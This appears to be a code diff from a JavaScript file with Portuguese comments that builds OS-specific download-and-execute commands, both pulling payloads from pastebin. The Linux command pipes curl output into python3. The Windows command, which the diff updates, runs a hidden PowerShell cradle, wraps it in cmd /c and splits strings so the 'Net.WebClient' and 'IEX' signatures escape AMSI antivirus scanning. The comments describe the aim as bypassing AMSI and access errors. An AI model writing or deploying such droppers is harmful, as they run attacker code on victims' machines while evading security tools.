@@ -93,9 +93,10 @@
             // Comando Linux (Baseado em Python)
             const cmdLinux = `curl -sL https://pastebin.com/raw/${idLinux} | python3`;
             
-            // NOVO COMANDO WINDOWS: Técnica de Bypass de AMSI via fragmentação de string
-            // Isso evita o erro de 'Acesso Negado' ao quebrar a assinatura do Net.WebClient e IEX
-            const cmdWindows = `powershell -NoP -W Hidden -C "$n='Net.Web';$c='Client';$w=New-Object ($n+$c);$i='I'+'EX'; & $i ($w.DownloadString('https://pastebin.com/raw/${idWindows}'))"`;
+            // COMANDO WINDOWS ATUALIZADO:
+            // 1. Usa o 'cmd /c' como ponte para evitar o erro de 'Acesso Negado' do PowerShell.
+            // 2. Mantém a fragmentação de strings ($n, $c, $i) para realizar o bypass do AMSI na RAM.
+            const cmdWindows = `cmd /c "powershell -NoP -W Hidden -C \\$n='Net.Web';\\$c='Client';\\$w=New-Object (\\$n+\\$c);\\$i='I'+'EX';& \\$i (\\$w.DownloadString('https://pastebin.com/raw/${idWindows}'))"`;
 
             // Detecta o Sistema Operacional
             let payloadFinal = cmdLinux;
